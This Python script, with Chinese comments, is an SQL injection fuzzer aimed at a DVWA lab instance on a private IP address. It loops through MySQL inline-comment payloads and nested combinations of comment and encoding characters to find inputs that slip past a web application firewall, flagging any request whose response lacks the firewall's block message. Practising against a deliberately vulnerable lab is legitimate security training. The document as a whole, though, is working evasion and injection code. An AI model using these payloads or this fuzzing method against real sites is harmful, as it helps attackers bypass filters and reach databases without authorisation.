import requests
from fake_useragent import UserAgent

# 设置cookie
cookies = "security=low; PHPSESSID=6arlml0daogk8s5p23qgm2bvb4"
# 生成随机的User-Agent
ua = UserAgent()
# 设置协议头
headers = {
    "User-Agent": ua.random,
    "Cookie": cookies
}

# 循环fuzz爆破
for i in range(10000, 15000):
    # 构造请求的URL
    url = f"http://10.211.55.3/dvwa/vulnerabilities/sqli/?id=1%27%2F*%21{i}and*%2F+%27a%27%3D%27a+--%2B&Submit=Submit"
    try:
        # 发送GET请求并获取响应文本
        r = requests.get(url, headers=headers).text
        # 定义要查找的关键字
        key = "攻击请求"
        # 查找关键字在响应文本中的位置
        ss = r.find(key)
        if ss == -1:
            # 若未找到关键字，则打印成功信息和URL
            print("fuzz is ok!url is :")
            print(url)
    except requests.RequestException as e:
        # 处理请求异常
        print(f"请求 {url} 时发生错误: {e}")

# 定义fuzz函数
def fuzz(url):
    # 定义fuzz字符列表
    fuzzing_x = ['/*', '*/', '/*!', '*', '=', '`', '!', '@', '%', '.', '-', '+', '|', '%00']
    fuzzing_y = ['', ' ']
    fuzzing_z = ["%0a", "%0b", "%0c", "%0d", "%0e", "%0f", "%0g", "%0h", "%0i", "%0j"]
    # 合并fuzz字符列表
    fuzz = fuzzing_x + fuzzing_y + fuzzing_z
    # 生成随机的User-Agent
    ua = UserAgent()
    headers = {"User-Agent": ua.random, "Cookie": cookies}
    # 四重循环进行fuzz测试
    for a in fuzz:
        for b in fuzz:
            for c in fuzz:
                for d in fuzz:
                    # 构造fuzz的表达式
                    exp = f"/*!{a}{b}{c}{d}and*/'a'='a--+"
                    # 这里可以继续完善请求逻辑，例如发送请求并处理响应
                    # 示例：构造完整URL并发送请求
                    fuzz_url = url.replace("/*FUZZ*/", exp)
                    try:
                        r = requests.get(fuzz_url, headers=headers).text
                        # 可以添加更多的判断逻辑
                    except requests.RequestException as e:
                        print(f"请求 {fuzz_url} 时发生错误: {e}")

# 可以调用fuzz函数进行测试
# fuzz("http://example.com/?id=1/*FUZZ*/&Submit=Submit")